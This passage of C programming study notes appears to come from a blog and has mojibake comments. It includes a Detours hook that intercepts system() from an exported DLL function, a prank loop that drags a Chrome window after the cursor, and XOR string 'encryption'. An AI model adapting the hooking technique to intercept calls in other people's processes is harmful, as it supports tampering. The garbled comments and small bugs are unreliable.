<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">time_t</span> ts;</span><br><span class="line">    <span class="built_in">srand</span>((<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">time</span>(&amp;ts));</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> data = <span class="built_in">rand</span>() % <span class="number">4</span>;  <span class="comment">//0 1 2 3 ä»£è¡¨å››ä¸ªæ–¹ä½</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, data);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    HWND win = <span class="built_in">FindWindowA</span>(<span class="string">&quot;Chrome_WidgetWin_1&quot;</span>, <span class="string">&quot;æ–°æ ‡ç­¾é¡µ - Google Chrome&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (win) &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                POINT POS1;</span><br><span class="line">                <span class="built_in">GetCursorPos</span>(&amp;POS1);</span><br><span class="line">                <span class="built_in">SetWindowPos</span>(win,<span class="literal">NULL</span>, POS1.x ,POS1.y,<span class="number">400</span>,<span class="number">400</span>,<span class="number">0</span>);</span><br><span class="line">                <span class="built_in">Sleep</span>(<span class="number">50</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="HOOK-system"><a href="#HOOK-system" class="headerlink" title="HOOK system"></a>HOOK system</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hook  system()</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;detours.h&quot;</span>		<span class="comment">//ä½¿ç”¨è¯¥åº“å»ä¿®æ”¹å‡½æ•°çš„åœ°å€   æ‰¾åˆ°åŸåœ°å€å†å»ä¿®æ”¹æˆæ–°çš„</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;detours.lib&quot;</span>)	</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//system();  //ä¸‹é¢ä¸ºsystemå‡½æ•°çš„å®šä¹‰</span></span><br><span class="line"><span class="comment">//_DCRTIMP int __cdecl system(</span></span><br><span class="line"><span class="comment">//	_In_opt_z_ char const* _Command</span></span><br><span class="line"><span class="comment">//);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> (*lpold)(			</span><br><span class="line"><span class="type">char</span> <span class="type">const</span>* _Command</span><br><span class="line">) = system;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">newsystem</span><span class="params">(_In_opt_z_ <span class="type">char</span> <span class="type">const</span>* _Command)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">MessageBoxA</span>(<span class="number">0</span>, <span class="string">&quot;hook&quot;</span>, _Command, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// lpold(_Command);  //æŒ‚é’© å…ˆæ‰§è¡Œä¸Šé¢çš„å†…å®¹ç„¶ååœ¨æ‰§è¡ŒåŸå†…å®¹</span></span><br><span class="line">    <span class="built_in">lpold</span>(_Command);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">hook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">DetourRestoreAfterWith</span>();<span class="comment">//æ¢å¤ä¹‹å‰çš„æ¨¡å¼çŠ¶æ€  é¿å…åå¤æ‹¦æˆª</span></span><br><span class="line">    <span class="built_in">DetourTransactionBegin</span>();<span class="comment">//å¼€å§‹åŠ«æŒ</span></span><br><span class="line">    <span class="built_in">DetourUpdateThread</span>(<span class="built_in">GetCurrentThread</span>());</span><br><span class="line">    <span class="built_in">DetourAttach</span>((<span class="type">void</span>**)&amp;lpold, newsystem);</span><br><span class="line">    <span class="built_in">DetourTransactionCommit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="çº¿ç¨‹"><a href="#çº¿ç¨‹" class="headerlink" title="çº¿ç¨‹"></a>çº¿ç¨‹</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨æŒ‡é’ˆè¿›è¡Œå†’æ³¡æ’åº  ä¸ä¼šç ´ååŸæ•°æ®</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">8</span>] = &#123; <span class="number">33</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">10</span> &#125;;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span>* p[<span class="number">8</span>] = &#123; a,a + <span class="number">1</span>,a + <span class="number">2</span>,a + <span class="number">3</span>,a + <span class="number">4</span>,a + <span class="number">5</span>,a + <span class="number">6</span>,a + <span class="number">7</span> &#125;;   <span class="comment">// åŠ constå p åªèƒ½è¯»ä¸èƒ½ä¿®æ”¹</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span><span class="number">-1</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span> - <span class="number">1</span> - i; j++) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (*p[j]&gt;*p[j+<span class="number">1</span>]) &#123;</span><br><span class="line">                    <span class="type">int</span>* lptemp = p[j];</span><br><span class="line">                    p[j] = p[j + <span class="number">1</span>];</span><br><span class="line">                    p[j + <span class="number">1</span>] = lptemp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>, *p[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span>  _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">NZ</span><span class="params">(LPVOID  lpparam)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">MessageBoxA</span>(<span class="number">0</span>, <span class="string">&quot;NNNNNNAAAAATEXT&quot;</span>, <span class="string">&quot;TITLE&quot;</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span>  <span class="title">fn</span><span class="params">(<span class="type">void</span>* lp)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span>* p = lp;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">sprintf</span>(str, <span class="string">&quot;ç¬¬%dä¸ªçª—å£&quot;</span>,*p);  <span class="comment">//æ‰“å°è¾“å‡ºåˆ°ç¼“å†²åŒºä¸­    </span></span><br><span class="line">    <span class="comment">//æ ¼å¼åŒ–å‡½æ•° ç¬¬ä¸€ä¸ªå‚æ•°ç¼“å†²åŒº  ç¬¬äºŒä¸ªå‚æ•° ç¬¬ä¸‰ä¸ªå‚æ•°</span></span><br><span class="line">    <span class="comment">// &#x27;sprintf&#x27;: This function or variable may be unsafe. Consider using sprintf_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS.</span></span><br><span class="line">    <span class="comment">// éœ€è¦åœ¨æœ€ä¸Šæ–¹å£°æ˜  #define  _CRT_SECURE_NO_WARNINGS </span></span><br><span class="line">    <span class="built_in">MessageBoxA</span>(<span class="number">0</span>, str, str, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//ä½¿ç”¨createThreadåˆ›å»ºçº¿ç¨‹</span></span><br><span class="line">    <span class="comment">//HANDLE hThread; // çº¿ç¨‹å¥æŸ„</span></span><br><span class="line">    <span class="comment">//DWORD dwThreadId;// ä¿æŒçº¿ç¨‹ID</span></span><br><span class="line">    <span class="comment">//for (size_t i = 0; i &lt; 3; i++)</span></span><br><span class="line">    <span class="comment">//&#123;</span></span><br><span class="line">    <span class="comment">//	hThread = CreateThread(NULL, NULL, NZ, NULL, 0, &amp;dwThreadId);</span></span><br><span class="line">    <span class="comment">//	WaitForSingleObject(hThread, INFINITE);  // æ·»åŠ è¯¥è¡Œä¸ºå¼‚æ­¥ å¦åˆ™æ˜¯åŒå¸ƒ</span></span><br><span class="line">    <span class="comment">//	CloseHandle(hThread);</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//_beginthread ç›¸æ¯”ä¸CreateTHread æ›´å¥½äº›</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> a[<span class="number">3</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> &#125;;</span><br><span class="line">            <span class="comment">//_beginthread(fn, 0, &amp;i);  // ç¬¬ä¸‰ä¸ªå‚æ•° </span></span><br><span class="line">            _beginthread(fn, <span class="number">0</span>, &amp;a[i]);	<span class="comment">//ä¸‰ä¸ªä¸åŒçš„å†…å­˜åœ°å€å€¼</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*ä½¿ç”¨å¤šçº¿ç¨‹æŸ¥æ‰¾ç”Ÿäº§éšæœºæ•°ä¸­é€‰ä¸­çš„æ•°å­— è¿™é‡Œæ˜¯100ä¸ªæ•°æ®ä½¿ç”¨10ä¸ªçº¿ç¨‹</span></span><br><span class="line"><span class="comment">å¦‚æœæ˜¯100ä¸ªæ•°æ® 8ä¸ªçº¿ç¨‹ æ²¡æ³•é™¤å°½   14*7=98  æœ€åä¸€ä¸ªçº¿ç¨‹åœ¨å¤„ç†å‰©ä¸‹çš„</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//#define M 100  // æ•°æ®æ•°é‡</span></span><br><span class="line"><span class="comment">//#define N 8 //çº¿ç¨‹æ•°é‡</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">stINFO</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span>* lpstart; <span class="comment">// èµ·å§‹åœ°å€</span></span><br><span class="line"><span class="type">int</span> length;</span><br><span class="line"><span class="type">int</span> findNum;</span><br><span class="line"><span class="type">int</span> threadId;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> FLAG = <span class="number">0</span>; <span class="comment">//åˆ¤æ–­æ˜¯å¦æ‰¾åˆ° æ²¡æ‰¾åˆ°ä¸º0  æ‰¾åˆ°ä¸º1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">find</span><span class="params">(<span class="type">void</span>* p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (FLAG) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">stINFO</span>* lp = p;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;çº¿ç¨‹%då¼€å§‹æŸ¥æ‰¾-----------------\n&quot;</span>,lp-&gt;threadId);</span><br><span class="line">    <span class="keyword">for</span> ( <span class="type">int</span>* start = lp-&gt;lpstart; start &lt; (lp-&gt;lpstart+lp-&gt;length); start++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (*start == lp-&gt;findNum) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;çº¿ç¨‹%dæ‰¾åˆ°ï¼Œæ•°æ®ä¸º%d,å†…å­˜åœ°å€ä¸º:%p---\n&quot;</span>, lp-&gt;threadId, *start, start);</span><br><span class="line">                FLAG = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;çº¿ç¨‹%dæŸ¥æ‰¾å®Œæ¯•ï¼Œæœªæ‰¾åˆ°----------\n&quot;</span>,lp-&gt;threadId);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> M 100 <span class="comment">//åˆå§‹åŒ–100ä¸ªæ•°æ®é‡</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> a[M] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">time_t</span> ts;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> randomNum = <span class="built_in">time</span>(&amp;ts);</span><br><span class="line">    <span class="built_in">srand</span>(randomNum);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; M; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            a[i] = <span class="built_in">rand</span>() % <span class="number">100</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%4d&quot;</span>, a[i]);</span><br><span class="line">            <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">10</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> findnumber;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;è¾“å…¥è¦æŸ¥æ‰¾çš„æ•°å­—:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf_s</span>(<span class="string">&quot;%d&quot;</span>, &amp;findnumber);</span><br><span class="line">    <span class="type">int</span> N;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;è¾“å…¥ä½¿ç”¨çš„çº¿ç¨‹æ•°é‡:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf_s</span>(<span class="string">&quot;%d&quot;</span>, &amp;N);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">stINFO</span> info[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (M % N == <span class="number">0</span>) &#123; <span class="comment">//æ•°æ®æ ‡å‡†å¯ä»¥é™¤å°½ æ•°æ®é‡å¯ä»¥è¢«çº¿ç¨‹æ•°é‡å¹³å‡åˆ†é…</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                info[i].lpstart = a + M/N * i;</span><br><span class="line">                info[i].length = M/N;</span><br><span class="line">                info[i].findNum = findnumber;</span><br><span class="line">                info[i].threadId = i;</span><br><span class="line"></span><br><span class="line">                _beginthread(find, <span class="number">0</span>, &amp;info[i]);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="comment">// 100/7=14+2     100 8</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; N<span class="number">-1</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                info[i].lpstart = a + M / (N<span class="number">-1</span>) * i;</span><br><span class="line">                info[i].length = M / (N<span class="number">-1</span>);</span><br><span class="line">                info[i].findNum = findnumber;</span><br><span class="line">                info[i].threadId = i;</span><br><span class="line">                _beginthread(find, <span class="number">0</span>, &amp;info[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">//å¤„ç†æœ€åä¸€ä¸ªçº¿ç¨‹ </span></span><br><span class="line">        <span class="type">int</span> i = N - <span class="number">1</span>;</span><br><span class="line">        info[i].lpstart = a + M / (N - <span class="number">1</span>) * i;</span><br><span class="line">        info[i].length = M / (N - <span class="number">1</span>);</span><br><span class="line">        info[i].findNum = findnumber;</span><br><span class="line">        info[i].threadId = i;</span><br><span class="line">        _beginthread(find, <span class="number">0</span>, &amp;info[i]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="constæƒé™æ§åˆ¶"><a href="#constæƒé™æ§åˆ¶" class="headerlink" title="constæƒé™æ§åˆ¶"></a>constæƒé™æ§åˆ¶</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* const åšæƒé™æ§åˆ¶</span></span><br><span class="line"><span class="comment">const åœ¨*å·¦è¾¹  const int* p 			ï¼ˆæŸ¥è¯¢æƒé™ï¼‰ å¯ä»¥æŸ¥è¯¢æ‰€æœ‰</span></span><br><span class="line"><span class="comment">const åœ¨*å³è¾¹  int * const p			å¯ä»¥ä¿®æ”¹å€¼ ä¸å¯ä»¥ä¿®æ”¹æŒ‡å‘    åªèƒ½ä¿®æ”¹è‡ªå·± ä¸èƒ½æŠŠåœ°å€æ‰§è¡Œåˆ«çš„åœ°å€ï¼ˆç±»ä¼¼ç”¨æˆ·æƒé™ï¼‰</span></span><br><span class="line"><span class="comment">const åœ¨*ä¸¤è¾¹  const int * const p		åªèƒ½è¯»è‡ªå·±çš„æ•°æ® æ²¡æ³•ä¿®æ”¹</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;		</span><br><span class="line">    <span class="built_in">int</span>(*p)[<span class="number">10</span>] = &amp;a;			<span class="comment">//æ•°ç»„æŒ‡é’ˆ</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n%p&quot;</span>,p,p+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="å­—ç¬¦ä¸²ç›¸å…³å‡½æ•°ç¼–å†™"><a href="#å­—ç¬¦ä¸²ç›¸å…³å‡½æ•°ç¼–å†™" class="headerlink" title="å­—ç¬¦ä¸²ç›¸å…³å‡½æ•°ç¼–å†™"></a>å­—ç¬¦ä¸²ç›¸å…³å‡½æ•°ç¼–å†™</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GetStringLenth</span><span class="params">(<span class="type">char</span> *str)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> length = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (*str)</span><br><span class="line">        &#123;</span><br><span class="line">            length++;</span><br><span class="line">            *str++;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//åŒæŒ‡é’ˆè½®è¯¢  ä½¿ç”¨ä¸¤ä¸ªæŒ‡é’ˆ  é”™ä½</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DeleteStringD</span><span class="params">(<span class="type">char</span> *str)</span></span>&#123;</span><br><span class="line">    <span class="type">char</span>* p1 = str;</span><br><span class="line">    <span class="type">char</span>* p2 = str;</span><br><span class="line">    <span class="keyword">while</span> (*p1 = *p2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (*p1 != <span class="string">&#x27;d&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// å¦‚æœä¸æ˜¯é€‰ä¸­çš„å­—æ¯ ä¸¤ä¸ªæŒ‡é’ˆå°±åŒæ—¶å¾€å‰åŠ¨</span></span><br><span class="line">            <span class="comment">//				   p1-p1	 -&gt;  dedf =&gt; eedf  =&gt;  edf  =&gt; ddf =&gt; fdf =&gt; df =&gt; df</span></span><br><span class="line">            <span class="comment">//			 a b c d  e  d  f  </span></span><br><span class="line">            <span class="comment">//				      p2-p2   -&gt;           edf  =&gt;  df   =&gt; f  =&gt; f   =&gt; f  =&gt; ç©º</span></span><br><span class="line">            <span class="comment">//                           abcdedf =&gt; abceedf          =&gt; abceddf         =&gt; abcefdf =&gt; abcef</span></span><br><span class="line"></span><br><span class="line">            p1++;</span><br><span class="line">            p2++;  <span class="comment">//å¦‚æœæ˜¯d é‚£ä¹ˆp1ä¸åŠ¨ ç„¶åp2å¾€å‰é¢åŠ   åˆ°dæ—¶ p2æŠŠå€¼èµ‹ç»™p1 </span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            p2++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å­—ç¬¦ä¸²å¼‚æˆ–åŠ å¯†   // å¼‚æˆ–ä¹‹å å†å¼‚æˆ–å°±ä¼šå˜æˆåŸæ¥çš„æ•°</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">XOREn</span><span class="params">(<span class="type">char</span>* str, <span class="type">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            str[i] ^= key;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> str1[] = <span class="string">&quot;abcdedf&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;, GetStringLenth(str1));</span></span><br><span class="line">    <span class="comment">//printf(&quot;%d&quot;, strlen(str1));</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//DeleteStringD(str1);</span></span><br><span class="line">    <span class="comment">//printf(&quot;%s\n&quot;, str1);</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">XOREn</span>(str1,<span class="number">64</span>);</span><br><span class="line">    <span class="comment">//printf(&quot;%s\n&quot;, str1);</span></span><br><span class="line">    <span class="comment">//XOREn(str1,64);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, str1);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="å¼‚æˆ–åˆ†æ®µåŠ å¯†"><a href="#å¼‚æˆ–åˆ†æ®µåŠ å¯†" class="headerlink" title="å¼‚æˆ–åˆ†æ®µåŠ å¯†"></a>å¼‚æˆ–åˆ†æ®µåŠ å¯†</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å¼‚æˆ–åˆ†æ®µåŠ å¯†</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> å¼‚æˆ–åˆ†æ®µåŠ å¯†(<span class="type">char</span>* str, <span class="type">char</span>* pass) &#123;</span><br><span class="line">    <span class="type">int</span> åŠ å¯†å­—ç¬¦ä¸²é•¿åº¦ = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="type">int</span> å¯†ç é•¿åº¦ = <span class="built_in">strlen</span>(pass);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (åŠ å¯†å­—ç¬¦ä¸²é•¿åº¦ % å¯†ç é•¿åº¦ == <span class="number">0</span>) &#123;				<span class="comment">// 120 / 6     122 /6 </span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; åŠ å¯†å­—ç¬¦ä¸²é•¿åº¦ / å¯†ç é•¿åº¦; i++)</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; å¯†ç é•¿åº¦; j++)</span><br><span class="line">            &#123;</span><br><span class="line">            str[i * å¯†ç é•¿åº¦ + j] ^= pass[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;												<span class="comment">// 122 / 6 = 20...2</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; åŠ å¯†å­—ç¬¦ä¸²é•¿åº¦ / å¯†ç é•¿åº¦; i++)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; å¯†ç é•¿åº¦; j++)</span><br><span class="line">        &#123;</span><br><span class="line">        str[i * å¯†ç é•¿åº¦ + j] ^= pass[j];		<span class="comment">// 1-120</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> k = <span class="number">0</span>; k &lt; åŠ å¯†å­—ç¬¦ä¸²é•¿åº¦ % å¯†ç é•¿åº¦; k++)</span><br><span class="line">    &#123;</span><br><span class="line">    str[åŠ å¯†å­—ç¬¦ä¸²é•¿åº¦ / å¯†ç é•¿åº¦ * å¯†ç é•¿åº¦ + k] ^= pass[k];	<span class="comment">// 121  122</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> str[] = <span class="string">&quot;awagege&quot;</span>;</span><br><span class="line">    <span class="type">char</span> pass[] = <span class="string">&quot;12345&quot;</span>;</span><br><span class="line">    å¼‚æˆ–åˆ†æ®µåŠ å¯†(str, pass);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%s&quot;</span>, str);</span><br><span class="line">    å¼‚æˆ–åˆ†æ®µåŠ å¯†(str, pass);</span><br><span 